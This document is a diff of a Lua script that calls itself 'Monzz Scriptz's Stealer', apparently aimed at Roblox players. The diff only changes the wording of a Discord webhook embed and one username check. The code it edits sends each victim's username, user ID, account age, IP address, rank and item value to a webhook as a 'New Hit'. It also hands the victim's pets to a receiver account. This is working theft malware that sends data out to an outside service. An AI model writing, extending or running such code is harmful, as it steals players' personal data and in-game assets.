@@ -1027,7 +1027,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1037,14 +1037,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":cry: **Pets left** :cry:",
+                    ["name"] = ":cry: **Pets Amount** :cry:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1097,7 +1097,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1107,14 +1107,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":cry: **Pets left** :cry:",
+                    ["name"] = ":cry: **Pets Amount** :cry:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1239,7 +1239,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
